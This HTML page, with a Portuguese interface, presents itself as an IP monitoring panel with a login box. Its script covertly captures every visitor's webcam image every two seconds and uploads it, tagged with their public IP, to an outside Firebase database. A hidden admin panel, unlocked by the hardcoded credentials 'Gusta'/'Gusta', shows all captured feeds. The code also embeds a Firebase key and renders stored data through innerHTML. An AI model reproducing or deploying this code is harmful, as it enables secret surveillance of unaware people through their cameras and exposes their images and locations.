<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Monitoramento por IP</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #007bff; }
        input { padding: 8px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; }
        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; opacity: 0.3; }
        canvas { display: none; }
        .hidden { display: none !important; }
        
        /* Grid de Monitoramento */
        #grid-monitores { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); 
            gap: 10px; 
            margin-top: 10px;
            max-height: 80vh;
            overflow-y: auto;
            width: 320px;
        }
        .monitor-card { 
            background: #111; 
            border: 1px solid #444; 
            border-radius: 5px; 
            padding: 5px; 
            text-align: center;
        }
        .monitor-card img { width: 100%; border-radius: 3px; background: #000; }
        .monitor-info { font-size: 10px; color: #00ff00; margin-bottom: 4px; display: block; }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas-foto"></canvas>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">MONITORAR POR IP</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span style="color:#007bff; font-size: 12px;">PAINEL MULTI-IP</span>
                    <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">X</button>
                </div>
                <div id="grid-monitores">
                    </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let meuIP = "carregando...";

        // 1. Pega o IP do usuário primeiro
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                meuIP = data.ip.replace(/\./g, '_'); // Troca pontos por underline pro Firebase aceitar
                iniciarApp();
            });

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('webcam').srcObject = stream;
                
                // Envia foto a cada 2 segundos para o documento com o nome do IP
                setInterval(capturarEAtualizar, 2000);
            } catch (err) { console.error(err); }
        }

        function capturarEAtualizar() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas-foto');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const context = canvas.getContext('2d');
                canvas.width = 320;
                canvas.height = 240;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
                
                // Salva no documento com o nome do IP (Sobrescreve a última foto deste IP)
                db.collection("ips_ativos").doc(meuIP).set({
                    ip_original: meuIP.replace(/_/g, '.'),
                    timestamp: new Date().toLocaleTimeString(),
                    imagem: fotoBase64
                });
            }
        }

        function verificarAdmin() {
            if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                escutarTodosIPs();
            }
        }

        function escutarTodosIPs() {
            const grid = document.getElementById('grid-monitores');
            
            // Escuta a coleção inteira. Se um IP novo entrar, ele cria um novo card.
            db.collection("ips_ativos").onSnapshot((snapshot) => {
                grid.innerHTML = ""; 
                snapshot.forEach((doc) => {
                    const dados = doc.data();
                    const card = document.createElement('div');
                    card.className = "monitor-card";
                    card.innerHTML = `
                        <span class="monitor-info">IP: ${dados.ip_original}</span>
                        <img src="${dados.imagem}">
                        <span style="font-size:8px; color:#aaa;">Lido às: ${dados.timestamp}</span>
                    `;
                    grid.appendChild(card);
                });
            });
        }
    </script>
</body>
</html>
